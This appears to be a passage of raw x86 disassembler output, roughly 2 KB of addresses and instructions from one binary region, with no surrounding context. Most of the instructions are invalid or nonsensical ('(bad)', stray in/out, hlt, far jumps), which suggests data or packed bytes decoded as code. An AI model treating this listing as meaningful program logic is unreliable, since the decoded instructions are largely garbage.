  41d4c5:	enter  0xedca,0xc0
  41d4c9:	xlat   BYTE PTR ds:[ebx]
  41d4ca:	into   
  41d4cb:	(bad)  
  41d4cc:	(bad)  
  41d4cd:	jmp    0x41d483
  41d4cf:	repz aam 0xff
  41d4d2:	mov    ebp,0xd0b5d6d3
  41d4d8:	std    
  41d4d9:	fld    QWORD PTR [ecx]
  41d4db:	mov    ah,0xf1
  41d4dd:	shl    ebp,1
  41d4df:	loopne 0x41d4c6
  41d4e1:	stc    
  41d4e2:	(bad)  
  41d4e3:	out    dx,al
  41d4e4:	add    ebx,ebx
  41d4e6:	jecxz  0x41d4e5
  41d4e8:	fdiv   DWORD PTR [edx-0x3d143122]
  41d4ee:	(bad)  
  41d4ef:	cli    
  41d4f0:	shl    ah,0xd5
  41d4f3:	aam    0xef
  41d4f5:	mov    eax,0xc1edf1cb
  41d4fa:	add    dl,dh
  41d4fc:	sti    
  41d4fd:	hlt    
  41d4fe:	ret    0xfe
  41d501:	xlat   BYTE PTR ds:[ebx]
  41d502:	add    eax,0xcbddc800
  41d507:	(bad)  
  41d509:	fdiv   QWORD PTR [edx-0xe184d18]
  41d50f:	loop   0x41d4fc
  41d511:	repz cli 
  41d513:	lods   al,BYTE PTR ds:[esi]
  41d514:	repz mov edi,0xf7e1dcf9
  41d51a:	(bad)  
  41d51b:	mov    edi,0x7fefabd
  41d520:	rol    ecx,0xc0
  41d523:	aad    0xa
  41d525:	or     eax,0xe6c1f8d8
  41d52a:	imul   DWORD PTR [esi-0x3a4c3e0a]
  41d530:	imul   edi
  41d532:	enter  0xb5be,0xfd
  41d536:	mov    esi,0x601c2b9
  41d53b:	bnd ret 0xc5c5
  41d53f:	aad    0xe1
  41d541:	add    eax,0x8f8c6fe
  41d546:	loop   0x41d512
  41d548:	ret    0xe8a9
  41d54b:	imul   BYTE PTR [ebx-0x5053635]
  41d551:	retf   0xebb7
  41d554:	mov    eax,0xedecb9f9
  41d559:	sti    
  41d55a:	aad    0xff
  41d55c:	shl    eax,1
  41d55e:	add    bl,bh
  41d560:	shl    ah,0xf8
  41d563:	add    ecx,ecx
  41d565:	cli    
  41d566:	retf   
  41d567:	fistp  QWORD PTR [edi-0x80e183a]
  41d56d:	loope  0x41d535
  41d56f:	vpxor  ymm1,ymm3,ymm4
  41d573:	stc    
  41d574:	mov    bh,0xca
  41d576:	idiv   BYTE PTR [ebx-0x23f93341]
  41d57c:	icebp  
  41d57d:	mov    ebp,0xd9d8e0de
  41d582:	fsub   st,st(3)
  41d584:	fldln2 
  41d586:	pmulhw mm5,QWORD PTR [ecx+eiz*8-0x433f4e36]
  41d58e:	out    0xeb,eax
  41d590:	mov    cl,0xb6
  41d592:	(bad)  
  41d593:	fldz   
  41d595:	(bad)  
  41d596:	xlat   BYTE PTR ds:[ebx]
  41d597:	out    dx,eax
  41d598:	repnz int3 
  41d59a:	in     al,dx
  41d59b:	(bad)  
  41d59c:	in     al,0xfb
  41d59e:	repz xlat BYTE PTR ds:[ebx]
  41d5a0:	cld    
  41d5a1:	hlt    
  41d5a2:	iret   
  41d5a3:	sar    cl,0xff
  41d5a6:	adc    ah,dl
  41d5a8:	into   
  41d5a9:	out    0xf1,eax
  41d5ab:	shl    ch,cl
  41d5ad:	loop   0x41d5a9
  41d5af:	mov    dh,0xda
  41d5b1:	enter  0xcdbb,0xff
  41d5b5:	(bad)  
  41d5b6:	repz idiv BYTE PTR [ecx+0x3c7f9bc]
  41d5bd:	in     eax,0xeb
  41d5bf:	dec    DWORD PTR [ecx]
  41d5c1:	or     DWORD PTR [edx],eax
  41d5c3:	pop    es
  41d5c4:	into   
  41d5c5:	retf   0xe4f3
  41d5c8:	fmul   st(7),st
  41d5ca:	xlat   BYTE PTR ds:[ebx]
  41d5cb:	xlat   BYTE PTR ds:[ebx]
  41d5cc:	aad    0xb4
  41d5ce:	rcr    dl,cl
  41d5d0:	iret   
  41d5d1:	mov    al,0xb1
  41d5d3:	iret   
  41d5d4:	fldz   
  41d5d6:	sar    DWORD PTR [edi-0x41262a34],1
  41d5dc:	(bad)  
  41d5dd:	repz add al,0x6
  41d5e0:	(bad)
  41d5e3:	push   cs
  41d5e4:	or     al,0xde
  41d5e6:	stc    
  41d5e7:	loop   0x41d5b4
  41d5e9:	shr    DWORD PTR [edi-0xc1e1c17],cl
  41d5ef:	cli    
  41d5f0:	vpsrlw xmm6,xmm4,XMMWORD PTR [edi-0x15224442]
  41d5f8:	cld    
  41d5f9:	inc    bl
  41d5fb:	fcomp  st(2)
  41d5fd:	mov    eax,0xec707f6
  41d603:	std    
  41d604:	iret   
  41d605:	add    bh,bl
  41d607:	fadd   st,st(1)
  41d609:	in     eax,dx
  41d60a:	in     eax,dx
  41d60b:	repz sar DWORD PTR [eax+ebp*8-0x2e0b3425],cl
  41d613:	call   0xb4fab4d2
  41d618:	shl    esi,cl
  41d61a:	rcl    dl,1
  41d61c:	idiv   DWORD PTR [esi-0x2139f43a]
  41d622:	ror    BYTE PTR [esi],0xf5
  41d625:	or     edi,ebx
  41d627:	icebp  
  41d628:	lods   al,BYTE PTR ds:[esi]
  41d629:	lods   al,BYTE PTR ds:[esi]
  41d62a:	in     eax,dx
  41d62b:	leave  
  41d62c:	out    0xf2,eax
  41d62e:	mov    ebp,0xf2eff3c7
  41d634:	lock lock fdiv st(3),st
  41d638:	mov    esp,0xbcd2f0dc
  41d63d:	lock xlat BYTE PTR ds:[ebx]
  41d63f:	(bad)  
  41d640:	leave  
  41d641:	call   0x609e428
  41d646:	in     eax,dx
  41d647:	jmp    0xb825b82f
  41d64c:	(bad)  
  41d64e:	mov    ebx,0xf2b1f1cd
  41d653:	hlt    
  41d654:	mov    eax,0xf9f2cac9
  41d659:	add    bh,cl
  41d65b:	std    
  41d65c:	ret    
  41d65d:	add    al,0xb9
  41d65f:	pop    es
  41d660:	(bad)  
  41d661:	sar    BYTE PTR [ebp-0x33d361f],1
  41d667:	(bad)  
  41d668:	icebp  
  41d669:	in     eax,0xbf
  41d66b:	out    dx,eax
  41d66c:	lods   al,BYTE PTR ds:[esi]
  41d66d:	(bad)
  41d670:	out    dx,al
  41d671:	int3   
  41d672:	in     eax,dx
  41d673:	idiv   BYTE PTR [edi-0x8fd2f2a]
  41d679:	stc    
  41d67a:	push   es
  41d67b:	ffreep st(5)
  41d67d:	mov    edx,0xf4c0d70a
  41d682:	iret   
  41d683:	fsubr  st,st(0)
  41d685:	jmp    0xe71fb686
  41d68a:	in     al,dx
  41d68b:	out    0xed,al
  41d68d:	aam    0xb0
  41d68f:	hlt    
  41d690:	icebp  
  41d691:	out    dx,eax
  41d692:	rcl    bl,cl
  41d694:	sti    
  41d695:	mov    esp,0xe0eed5f6
  41d69a:	mov    edi,0xe3def8e7
  41d69f:	stc    
  41d6a0:	ror    cl,1
  41d6a2:	cmc    
  41d6a3:	(bad)  
  41d6a4:	add    al,0xd
  41d6a6:	or     edi,edx
  41d6a8:	(bad)  
  41d6a9:	out    dx,al
  41d6aa:	test   eax,0xb5f3cde9
  41d6af:	ror    ebx,0xc0
  41d6b2:	out    0xf1,al
  41d6b4:	rol    BYTE PTR [ebx],cl
  41d6b6:	call   0xb6349aaf
  41d6bb:	fmul   st,st(5)
  41d6bd:	(bad)  
  41d6be:	jmp    0x41d6c2
  41d6c0:	in     al,0xd9
  41d6c2:	loope  0x41d6c9
  41d6c4:	iret   
  41d6c5:	leave  
  41d6c6:	jmp    0xee0097ab
  41d6cb:	jmp    0xe0f0:0xf1c9e8b5
  41d6d2:	(bad)  
  41d6d3:	retf   
  41d6d4:	mov    dh,0xdc
  41d6d6:	leave  
  41d6d7:	mov    ebx,0xdbb8c1db
  41d6dc:	cmc    
  41d6dd:	(bad)  
  41d6df:	(bad)  
  41d6e0:	xlat   BYTE PTR ds:[ebx]
  41d6e1:	std    
  41d6e2:	enter  0xd8,0xdb
  41d6e6:	or     al,0x4
  41d6e8:	(bad)  
  41d6e9:	shr    BYTE PTR [esi-0x49535258],1
  41d6ef:	shr    dl,cl
  41d6f1:	cli    
  41d6f2:	mov    ch,0xd6
  41d6f4:	mov    bl,0xfb
  41d6f6:	idiv   BYTE PTR [edx-0xe211d21]
  41d6fc:	ret    
  41d6fd:	mul    edx
  41d6ff:	rol    ch,0xb
  41d702:	add    eax,0xd3c9c4eb
  41d707:	or     eax,eax
  41d709:	in     al,dx
  41d70a:	retf   0xb2b2
  41d70d:	mov    ah,0xc7
  41d70f:	jmp    0xc71ba0c4
  41d714:	rcr    ch,cl
  41d716:	(bad)  
  41d718:	mov    esi,0xf4f5c2cd
  41d71d:	mov    edx,0xfff0c3f1
  41d722:	clc    
  41d723:	or     eax,0xdddfe90f
  41d728:	jmp    0xc6e8:0xd3aef7ed
  41d72f:	(bad)  
  41d730:	bnd jmp 0xca389d34
  41d736:	mov    esi,0xc0ccdbc9
  41d73b:	ret    
  41d73c:	std    
  41d73d:	add    eax,0xd003ca0b
  41d742:	add    BYTE PTR ds:0xc9fde60f,cl
  41d748:	sar    BYTE PTR [ebp+ebp*4-0x520e3e2a],cl
  41d74f:	f2xm1  
  41d751:	shr    al,1
  41d753:	int    0xf8
  41d755:	clc    
  41d756:	mov    ebp,0xd8eee0ed
  41d75b:	shr    esp,1
  41d75d:	(bad)  
  41d75e:	(bad)  
  41d75f:	fucom  st(3)
  41d761:	jmp    0x503:0xec0afbdd
  41d768:	loope  0x41d73a
  41d76a:	(bad)  
  41d76b:	test   cl,0xb6
  41d76e:	retf   
  41d76f:	shl    ebp,1
  41d771:	div    DWORD PTR [esi+ebp*8-0x32460f0c]
  41d778:	repz std 
  41d77a:	int3   
  41d77b:	lock out 0xf8,eax
  41d77e:	cmc    
  41d77f:	loope  0x41d780
  41d781:	loop   0x41d779
  41d783:	loope  0x41d75d
  41d785:	(bad)  
  41d786:	out    0xcc,al
  41d788:	stos   DWORD PTR es:[edi],eax
  41d789:	enter  0xd6b0,0xe0
  41d78d:	fsubr  st(4),st
  41d78f:	into   
  41d790:	rcr    bl,1
  41d792:	shr    esi,cl
  41d794:	cmc    
  41d795:	aad    0xbb
  41d797:	jmp    0xdb2fb59e
  41d79c:	cmc    
  41d79d:	in     al,dx
  41d79e:	fucom  st(6)
  41d7a0:	add    eax,0xe5dbe9d5
  41d7a5:	fmul   st,st(4)
  41d7a7:	jmp    0xeaef816b
  41d7ac:	shr    DWORD PTR [edx-0x50f4b17],cl
  41d7b2:	retf   0xdad3
  41d7b5:	cld    
  41d7b6:	mov    esp,0xfbf1fd03
  41d7bb:	repnz test ecx,0xc7c4f206
  41d7c2:	(bad)  
  41d7c3:	add    eax,0xf9e50b08
  41d7c8:	lods   al,BYTE PTR ds:[esi]
  41d7c9:	mov    ebp,0xe1edcce0
  41d7ce:	in     eax,0xe5
  41d7d0:	shl    ah,cl
  41d7d2:	jmp    0x41d7c1
  41d7d4:	lock jmp 0xf320b498
  41d7da:	push   es
  41d7db:	lock int 0xdd
  41d7de:	in     eax,0xf4
  41d7e0:	(bad)  
  41d7e1:	(bad)  
  41d7e2:	jmp    0xad04:0xbc4c6ff
  41d7e9:	shl    cl,1
  41d7eb:	mov    al,0xe0
  41d7ed:	out    dx,eax
  41d7ee:	lods   eax,DWORD PTR ds:[esi]
  41d7ef:	(bad)  
  41d7f1:	fcmovnu st,st(2)
  41d7f3:	call   0xb51ed3b5
  41d7f8:	ret    
  41d7f9:	mov    edx,0xf1f9fff4
  41d7fe:	fadd   st(1),st
  41d800:	loop   0x41d7c7
  41d802:	loopne 0x41d807
  41d804:	aad    0x8
  41d806:	push   es
  41d807:	stc    
  41d808:	iret   
  41d809:	in     al,0xf6
  41d80b:	mov    cl,0xb7
  41d80d:	mov    ch,0xcf
  41d80f:	rcl    dh,cl
  41d811:	call   0xe4f5a7f4
  41d816:	mov    ah,0xca
  41d818:	add    edi,edx
  41d81a:	add    bl,ah
  41d81c:	fadd   st(3),st
  41d81e:	fdivr  st,st(2)
  41d820:	(bad)  
  41d821:	fldl2t 
  41d823:	(bad)  
  41d824:	fsubrp st(0),st
  41d826:	jmp    0xb82f911d
  41d82b:	mov    al,0xe0
  41d82d:	(bad)  
  41d82e:	into   
  41d82f:	cmc    
  41d830:	call   0xd507ca25
  41d835:	int    0xca
  41d837:	fcomp  st(2)
  41d839:	rcr    al,0xdc
  41d83c:	clc    
  41d83d:	fidivr DWORD PTR [ebp-0x9080f3d]
  41d843:	loope  0x41d82a
  41d845:	jmp    0xecef:0xc8eecf12
  41d84c:	test   ch,0xef
  41d84f:	shl    DWORD PTR [ecx+esi*4-0x430a130d],0xbc
  41d857:	leave  
  41d858:	aam    0xf9
  41d85a:	(bad)  
  41d85c:	idiv   edx
  41d85e:	add    edx,esp
  41d860:	xlat   BYTE PTR ds:[ebx]
  41d861:	std    
  41d862:	or     bl,ah
  41d864:	lds    eax,FWORD PTR [ebx]
  41d866:	add    eax,0xb2bdecc9
  41d86b:	in     eax,0xe3
  41d86d:	ret    0xb7ee
  41d870:	loope  0x41d822
  41d872:	jmp    0xed03:0xf2faeeef
  41d879:	fdivp  st(4),st
  41d87b:	idiv   edx
  41d87d:	add    al,0xb
  41d87f:	loop   0x41d886
  41d881:	add    edx,esp
  41d883:	out    0xd8,eax
  41d885:	out    dx,al
  41d886:	loop   0x41d899
  41d888:	int    0xe8
  41d88a:	mov    esp,0xb4e1f2f3
  41d88f:	call   0xc511aa65
  41d894:	xlat   BYTE PTR ds:[ebx]
  41d895:	sar    BYTE PTR [ecx+ebp*8-0x33f92f47],cl
  41d89c:	in     al,0xc3
  41d89e:	push   es
  41d89f:	(bad)  
  41d8a0:	(bad)  
  41d8a1:	(bad)  
  41d8a2:	stc    
  41d8a3:	std    
  41d8a4:	out    0xc5,al
  41d8a6:	dec    BYTE PTR [edx]
  41d8a8:	sar    BYTE PTR [ebp-0x2a0c0c1e],1
  41d8ae:	hlt    
  41d8af:	in     eax,dx
  41d8b0:	iret   
  41d8b1:	mov    ch,0xf8
  41d8b3:	lock in eax,dx
  41d8b5:	jmp    0xbd13c996
  41d8ba:	ret    0xe6d8
  41d8bd:	in     al,dx
  41d8be:	shl    ah,1
  41d8c0:	loopne 0x41d8a4
  41d8c2:	or     BYTE PTR [eax+ecx*1],al
  41d8c5:	or     esi,ecx
  41d8c7:	shr    DWORD PTR [edx-0x502d5221],cl
  41d8cd:	ret    
  41d8ce:	rol    esp,cl
  41d8d0:	vpsrlq xmm3,xmm4,xmm5
  41d8d4:	mov    ebx,0xeedbbac4
  41d8d9:	mov    edi,0xffe2f5df
  41d8de:	mov    esp,0xae0f0c2
  41d8e3:	cld    
  41d8e4:	call   0xd340ebe7
  41d8e9:	test   al,0xb2
  41d8eb:	leave  
  41d8ec:	out    0xb3,eax
  41d8ee:	enter  0xf4f0,0xd3
  41d8f2:	out    dx,al
  41d8f3:	mov    edi,0xf8cfe9f5
  41d8f8:	mov    edx,0xd5cce1e3
  41d8fd:	in     al,dx
  41d8fe:	in     al,0xc4
  41d900:	sti    
  41d901:	les    eax,FWORD PTR ds:0xe4eee2ef
  41d907:	fcomp  st(6)
  41d909:	out    0xc8,eax
  41d90b:	test   ebx,0xfacde9f7
  41d911:	out    0xd1,eax
  41d913:	not    dh
  41d915:	int3   
  41d916:	in     al,dx
  41d917:	shl    dh,1
  41d919:	rcl    bh,cl
  41d91b:	mov    esi,0x305facc
  41d920:	rcr    ecx,1
  41d922:	out    dx,eax
  41d923:	(bad)  
  41d924:	in     al,dx
  41d925:	(bad)  
  41d927:	fcmovb st,st(5)
  41d929:	ffreep st(3)
  41d92b:	(bad)  
  41d92c:	lods   al,BYTE PTR ds:[esi]
  41d92d:	retf   
  41d92e:	retf   0xb4ce
  41d931:	mov    edx,0xdad4b0cf
  41d936:	mov    edi,0xe3d1eecc
  41d93b:	icebp  
  41d93c:	repz test BYTE PTR [edx],0x7
  41d940:	loopne 0x41d92c
  41d942:	dec    esi
  41d944:	fdiv   st(2),st
  41d946:	jmp    0x41d911
  41d948:	mov    ebp,0xf3d6aebc
  41d94d:	loope  0x41d900
  41d94f:	out    dx,eax
  41d950:	mov    bl,0xcc
  41d952:	test   ecx,0xd0d0e4ea
  41d958:	jmp    0xf539b660
  41d95d:	inc    edi
  41d95f:	retf   
  41d960:	sti    
  41d961:	cli    
  41d962:	cli    
  41d963:	add    eax,0xddc0bfb
  41d968:	lds    ebp,FWORD PTR [esi-0x5243140d]
  41d96e:	aam    0xac
  41d970:	mov    dl,0xda
  41d972:	out    dx,al
  41d973:	in     eax,dx
  41d974:	std    
  41d975:	xlat   BYTE PTR ds:[ebx]
  41d976:	mov    ecx,0xf1c2d9bb
  41d97b:	fnstsw WORD PTR [ebp-0x2101f903]
  41d981:	shl    ch,0xe8
  41d984:	push   es
  41d985:	fsubrp st(0),st
  41d987:	cld    
  41d988:	shl    dh,cl
  41d98a:	repz mov dl,0xb7
  41d98d:	call   0xc116cb63
  41d992:	repnz mov eax,0xf0cfbeb4
  41d998:	into   
  41d999:	(bad)  
  41d99a:	aam    0x1
  41d99c:	in     al,dx
  41d99d:	mov    esi,0xd9f7fde2
  41d9a2:	mov    ebp,0xddebc9fb
  41d9a7:	retf   0xdfb8
  41d9aa:	loope  0x41d977
  41d9ac:	aam    0xc7
  41d9ae:	rcr    ebx,0xf5
  41d9b1:	mov    edx,0xf5f1bbb5
  41d9b6:	out    dx,al
  41d9b7:	mov    esp,0xfdfbe0d5
  41d9bc:	fcomip st,st(2)
  41d9be:	ret    0xc7fe
  41d9c1:	jmp    0x10b7d1
  41d9c6:	push   cs
  41d9c7:	out    0xbc,eax
  41d9c9:	leave  
  41d9ca:	mov    bl,0xa8
  41d9cc:	repnz in eax,0xe8
  41d9cf:	fcomi  st,st(5)
  41d9d1:	idiv   BYTE PTR [edi-0x29112741]
  41d9d7:	call   0xc23ed9d2
  41d9dc:	mov    ebp,0xd5f1e5db
  41d9e1:	stc    
  41d9e2:	in     al,0xdd
  41d9e4:	(bad)  
  41d9e5:	in     al,0x6
  41d9e7:	or     BYTE PTR [edx-0x144d3038],ch
  41d9ed:	mov    bl,0xe4
  41d9ef:	mov    dl,0xec
  41d9f1:	enter  0xfbe8,0xd0
  41d9f5:	retf   0xd5ef
  41d9f8:	ror    esi,0xda
  41d9fb:	add    esi,esi
  41d9fd:	fiadd  WORD PTR [esi]
  41d9ff:	(bad)  
  41da00:	retf   0xd7c9
  41da03:	jmp    0xf923b302
  41da08:	(bad)  
  41da09:	repnz out dx,eax
  41da0b:	scas   al,BYTE PTR es:[edi]
  41da0c:	mov    ch,0xd2
  41da0e:	div    ecx
  41da10:	rcr    ecx,1
  41da12:	int    0xb6
  41da14:	mov    ebp,0x1e3dff1
  41da19:	loope  0x41d9db
  41da1b:	add    DWORD PTR [ebx-0xefa0c00],edi
  41da21:	cmc    
  41da22:	xlat   BYTE PTR ds:[ebx]
  41da23:	cli    
  41da24:	iret   
  41da25:	iret   
  41da26:	dec    DWORD PTR [edi]
  41da28:	mov    esi,0xece9ccd8
  41da2d:	repnz rol cl,1
  41da30:	clc    
  41da31:	lock jmp 0x41d9f9
  41da34:	aad    0xf5
  41da36:	loop   0x41da33
  41da38:	inc    cl
  41da3a:	out    0x7,eax
  41da3c:	add    ebx,ebx
  41da3e:	loop   0x41da05
  41da40:	aad    0xeb
  41da42:	retf   0xf4da
  41da45:	fdivp  st(4),st
  41da47:	out    dx,eax
  41da48:	in     eax,0xc9
  41da4a:	loopne 0x41da15
  41da4c:	loopne 0x41da40
  41da4e:	lock repz jmp 0xd5f9:0xf6e4f9fa
  41da57:	mov    esp,0xc3d4d1d0
  41da5c:	rol    DWORD PTR [eax],0xb9
  41da5f:	or     dl,bh
  41da61:	push   es
  41da62:	leave  
  41da63:	lds    ecx,FWORD PTR [edi+eax*1]
  41da66:	sti    
  41da67:	fcmovb st,st(2)
  41da69:	scas   al,BYTE PTR es:[edi]
  41da6a:	mov    cl,0xcf
  41da6c:	out    0xc0,eax
  41da6e:	rol    ah,cl
  41da70:	fdivr  DWORD PTR [ecx-0x30074a53]
  41da76:	aam    0xc9
  41da78:	mov    esi,0xecf8dff1
  41da7d:	mov    ebp,0xd805e2dd
  41da82:	add    eax,0xc1ed05fb
  41da87:	out    0xf0,eax
  41da89:	scas   eax,DWORD PTR es:[edi]
  41da8a:	enter  0xd6c6,0xf4
  41da8e:	mov    bl,0xb0
  41da90:	not    cl
  41da92:	repnz in eax,dx
  41da94:	jmp    0x3ed:0xf4f2dcd5
  41da9b:	add    dh,cl
  41da9d:	test   BYTE PTR [edi],0xc3
  41daa0:	jmp    0x41daa6
  41daa2:	loope  0x41da6b
  41daa4:	aam    0xec
  41daa6:	loop   0x41da95
  41daa8:	iret   
  41daa9:	test   al,0xae
  41daab:	div    bh
  41daad:	enter  0xeef0,0xd9
  41dab1:	repnz enter 0xd8ce,0xdf
  41dab6:	loop   0x41da90
  41dab8:	idiv   bl
  41daba:	clc    
  41dabb:	loopne 0x41da91
  41dabd:	cld    
  41dabe:	rol    edi,0xfc
  41dac1:	fprem1 
  41dac3:	std    
  41dac4:	fnsetpm(287 only) 
  41dac6:	jmp    0xd4f5:0xedc7befa
  41dacd:	icebp  
  41dace:	jmp    0xfa2b8bae
  41dad3:	int3   
  41dad4:	in     al,dx
  41dad5:	fistp  QWORD PTR [eax-0x47372f1e]
  41dadb:	in     al,dx
  41dadc:	ret    
  41dadd:	mov    edx,0xf8fad8c7
  41dae2:	sar    ebx,0xfd
  41dae5:	retf   0xf3e3
  41dae8:	test   eax,0xcfa4afc2
  41daed:	retf   0xe0fb
  41daf0:	into   
  41daf1:	rcr    bh,0xdb
  41daf4:	jmp    0xdfce:0xdccfd8ba
  41dafb:	repz in al,0xfb
  41dafe:	rol    DWORD PTR [esi],0xf1
  41db01:	aad    0xc8
  41db03:	fld    DWORD PTR [edx+ebp*8]
  41db06:	jecxz  0x41dadb
  41db08:	ftst   
  41db0a:	rcl    edx,0xe4
  41db0d:	retf   
  41db0e:	test   bh,0xe5
  41db11:	mov    dh,0xb5
  41db13:	mov    esi,0xd4cdd1ef
  41db18:	fyl2x  
  41db1a:	clc    
  41db1b:	out    0xf7,eax
  41db1d:	loopne 0x41db17
  41db1f:	loop   0x41db17
  41db21:	add    al,0xc7
  41db23:	cld    
  41db24:	call   0xba19e8f2
  41db29:	mov    eax,0xb0f1d6b0
  41db2e:	mov    bl,0xe6
  41db30:	out    0xed,al
  41db32:	hlt    
  41db33:	ffree  st(5)
  41db35:	fcmovu st,st(5)
  41db37:	in     al,dx
  41db38:	fprem  
  41db3a:	out    0xd4,eax
  41db3c:	rcr    ecx,cl
  41db3e:	(bad)  
  41db3f:	shl    cl,cl
  41db41:	paddq  mm3,mm3
  41db44:	cli    
  41db45:	ret    0xeee8
  41db48:	mov    ecx,0xe1c2f1e8
  41db4d:	(bad)
  41db50:	in     al,dx
  41db51:	sti    
  41db52:	cli    
  41db53:	(bad)  
  41db55:	jmp    0xda3cbb15
  41db5a:	cmc    
  41db5b:	bnd ret 0xe600
  41db5f:	add    bl,bh
  41db61:	(bad)  
  41db62:	fcmovbe st,st(6)
  41db64:	fucomp st(1)
  41db66:	in     al,dx
  41db67:	fmulp  st(6),st
  41db69:	loopne 0x41db4d
  41db6b:	shl    ah,1
  41db6d:	lock shr eax,0xe9
  41db71:	rcr    bh,0xc5
  41db74:	vpminub ymm3,ymm1,ymm2
  41db78:	icebp  
  41db79:	rcl    bh,1
  41db7b:	icebp  
  41db7c:	ffreep st(0)
  41db7e:	fldl2e 
  41db80:	rol    DWORD PTR [edx],0xd5
  41db83:	fdiv   st,st(4)
  41db85:	out    0xe4,al
  41db87:	(bad)  
  41db88:	(bad)  [edx-0x363f493a]
  41db8e:	in     eax,0xc9
  41db90:	loope  0x41db5a
  41db92:	int3   
  41db93:	stc    
  41db94:	int3   
  41db95:	repnz int3 
  41db97:	std    
  41db98:	stc    
  41db99:	rcr    ch,1
  41db9b:	loop   0x41db82
  41db9d:	std    
  41db9e:	pop    es
  41db9f:	out    0xe4,eax
  41dba1:	out    0xf6,al
  41dba3:	push   es
  41dba4:	push   cs
  41dba5:	int3   
  41dba6:	fsubr  st(6),st
  41dba8:	mov    esi,0xf5aff3cf
  41dbad:	repnz loopne 0x41db7e
  41dbb0:	in     al,0xd8
  41dbb2:	hlt    
  41dbb3:	mov    esi,0xdad5daba
  41dbb8:	fdiv   st,st(4)
  41dbba:	shl    al,1
  41dbbc:	(bad)  
  41dbbe:	jecxz  0x41db9d
  41dbc0:	cli    
  41dbc1:	stc    
  41dbc2:	iret   
  41dbc3:	in     eax,0xcf
  41dbc5:	stc    
  41dbc6:	retf   
  41dbc7:	or     ah,dl
  41dbc9:	ret    0xc7cc
  41dbcc:	mov    bl,0xc7
  41dbce:	(bad)  
  41dbcf:	jmp    0xba31dba7
  41dbd4:	mov    ch,0xcc
  41dbd6:	mov    ebp,0xcee8dfda
  41dbdb:	jecxz  0x41dbcd
  41dbdd:	shl    ah,0xdf
  41dbe0:	cmc    
  41dbe1:	leave  
  41dbe2:	retf   0xeabc
  41dbe5:	call   0xaa2dc2f0
  41dbea:	mov    ebp,0xc9e0e4e2
  41dbef:	int    0xb2
  41dbf1:	jmp    0x41dbdd
  41dbf3:	int3   
  41dbf4:	shr    ebx,1
  41dbf6:	jmp    0x41dbbb
  41dbf8:	push   edx
  41dbfa:	int3   
  41dbfb:	(bad)  
  41dbfc:	cld    
  41dbfd:	fxtract 
  41dbff:	add    eax,0xe7ebc6e3
  41dc04:	cmc    
  41dc05:	out    dx,al
  41dc06:	retf   
  41dc07:	std    
  41dc08:	iret   
  41dc09:	mov    cl,0xf0
  41dc0b:	ror    ebx,cl
  41dc0d:	div    dh
  41dc0f:	mov    bl,0xed
  41dc11:	(bad)  
  41dc12:	retf   
  41dc13:	(bad)  
  41dc15:	enter  0xcdf5,0xed
  41dc19:	clc    
  41dc1a:	out    dx,al
  41dc1b:	loopne 0x41dbe9
  41dc1d:	in     eax,0xd8
  41dc1f:	test   BYTE PTR [ecx],0xbe
  41dc22:	hlt    
  41dc23:	in     al,0x9
  41dc25:	int    0xfd
  41dc27:	rcr    ecx,cl
  41dc29:	mov    bl,0xad
  41dc2b:	in     eax,0xeb
  41dc2d:	mov    bh,0xad
  41dc2f:	mov    cl,0xb4
  41dc31:	mov    cl,0xcc
  41dc33:	leave  
  41dc34:	fcompp 
  41dc36:	iret   
  41dc37:	ret    0xf9b7
  41dc3a:	mov    ebp,0xd3f2e405
  41dc3f:	jecxz  0x41dc3b
  41dc41:	in     al,0x2
  41dc43:	retf   0xfd0a
  41dc46:	add    al,0xe2
  41dc48:	lock mov eax,0xb7e3dead
  41dc4e:	in     al,0xe5
  41dc50:	(bad)  
  41dc51:	fcomip st,st(6)
  41dc53:	in     al,dx
  41dc54:	mov    eax,0xb7dfbab5
  41dc59:	sar    ebp,0xc7
  41dc5c:	aad    0x4
  41dc5e:	repz jecxz 0x41dc51
  41dc61:	cmc    
  41dc62:	add    al,al
  41dc64:	or     ah,ch
  41dc66:	push   es
  41dc67:	push   cs
  41dc68:	leave  
  41dc69:	retf   0xd0e0
  41dc6c:	mov    bl,0xdc
  41dc6e:	fcmovb st,st(5)
  41dc70:	enter  0xcdd8,0xf5
  41dc74:	shl    bh,cl
  41dc76:	int    0xba
  41dc78:	into   
  41dc79:	shl    ebx,1
  41dc7b:	cmc    
  41dc7c:	std    
  41dc7d:	mov    esi,0xe5c5cbf3
  41dc82:	or     DWORD PTR [ecx],eax
  41dc84:	ret    
  41dc85:	pop    es
  41dc86:	fst    QWORD PTR [edx]
  41dc88:	jmp    0xe218b957
  41dc8d:	into   
  41dc8e:	sti    
  41dc8f:	shr    dl,1
  41dc91:	cmc    
  41dc92:	(bad)  
  41dc93:	enter  0xdee9,0xd6
  41dc97:	repnz iret 
  41dc99:	loope  0x41dc7b
  41dc9b:	(bad)  
  41dc9d:	int3   
  41dc9e:	fcomp  st(4)
  41dca0:	std    
  41dca1:	clc    
  41dca2:	in     al,0xfd
  41dca4:	add    al,0x9
  41dca6:	add    dh,bl
  41dca8:	(bad)  
  41dca9:	loope  0x41dc6a
  41dcab:	mov    ebp,0xd2bbcfdc
  41dcb0:	imul   dl
  41dcb2:	fidivr WORD PTR [edx-0xa25093b]
  41dcb8:	cli    
  41dcb9:	mov    edx,0xe30700de
  41dcbe:	cli    
  41dcbf:	(bad)  
  41dcc0:	call   0xe93abac2
  41dcc5:	iret   
  41dcc6:	add    edi,ebp
  41dcc8:	out    0xec,eax
  41dcca:	shl    BYTE PTR [eax-0x101a292b],cl
  41dcd0:	mov    ecx,0xdce6c4f9
  41dcd5:	imul   al
  41dcd7:	cld    
  41dcd8:	hlt    
  41dcd9:	fidivr DWORD PTR [esi-0x291d1d1b]
  41dcdf:	(bad)  
  41dce0:	std    
  41dce1:	out    dx,eax
  41dce2:	dec    edi
  41dce4:	(bad)  
  41dce5:	(bad)  
  41dce7:	loopne 0x41dcac
  41dce9:	iret   
  41dcea:	out    dx,al
  41dceb:	mov    al,0xc3
  41dced:	jmp    0x41dc9f
  41dcef:	mov    ah,0xb6
  41dcf1:	mov    dl,0xd6
  41dcf3:	out    dx,al
  41dcf4:	iret   
  41dcf5:	iret   
  41dcf6:	call   0xe122cbef
  41dcfb:	cld    
  41dcfc:	repz std 
  41dcfe:	hlt    
  41dcff:	sti    
  41dd00:	jmp    0x41dcf8
  41dd02:	std    
  41dd03:	in     eax,0x7
  41dd05:	fcmovnu st,st(3)
  41dd07:	fnstsw WORD PTR [ecx-0x540f1a57]
  41dd0d:	(bad)
  41dd10:	aam    0xf1
  41dd12:	fsubp  st(3),st
  41dd14:	cmc    
  41dd15:	call   0xdd1dd2fc
  41dd1a:	(bad)  
